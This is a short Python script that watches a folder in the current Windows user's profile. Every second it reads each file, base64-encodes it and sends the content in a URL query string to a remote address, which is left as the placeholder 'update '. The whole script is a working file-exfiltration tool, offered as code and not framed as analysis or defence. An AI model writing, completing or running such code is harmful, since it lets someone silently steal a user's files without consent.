import os
import time
import base64
import requests
from win32api import GetUserName

def get_file_content_and_base64_encode(filepath):
    with open(filepath, "rb") as f:
        file_content = f.read()
        encoded_content = base64.b64encode(file_content).decode("utf-8")
        return encoded_content

def monitor_file_path(file_path, url):
    print("Monitoring path:", file_path)
    while True:
        for file_name in os.listdir(file_path):
            file_path_full = os.path.join(file_path, file_name)
            if os.path.isfile(file_path_full):
                try:
                    with open(file_path_full, "r", encoding="utf-8") as f:
                        content = f.read()
                        encoded_content = get_file_content_and_base64_encode(file_path_full)
                        response = requests.get(url + "?content=" + encoded_content)
                        response.raise_for_status()
                        print(f"Sent file content to {url}: {content}")
                except Exception as e:
                    print(f"Error: {e}")
        time.sleep(1)

if __name__ == "__main__":
    username = GetUserName()
    file_path = f"C:\\Users\\{username}\\thispath"
    url = "update "
    monitor_file_path(file_path, url)
